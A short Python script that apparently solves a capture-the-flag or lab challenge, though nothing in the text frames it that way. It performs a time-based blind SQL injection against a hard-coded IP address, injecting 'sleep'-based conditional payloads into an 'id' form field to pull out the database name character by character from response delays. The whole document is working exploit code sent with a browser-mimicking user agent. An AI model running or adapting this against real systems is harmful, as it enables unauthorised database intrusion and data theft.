import requests

headers = {
    'Host': '60.205.205.193:8081',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
    'DNT': '1',
}

playload = ""
for e in range(1,8):
    for i in range(48,130):
        data = {
            'id': '1 and case when (ascii(mid(database(),{},1))={}) then sleep(4) else 1 end#'.format(e,i)
        }
        print(data["id"])
        response = requests.post('http://60.205.205.193:8081/', headers=headers, data=data)
        if(response.elapsed.total_seconds()) > 4:
            playload += chr(i)
            print(chr(i))
            break
print(playload)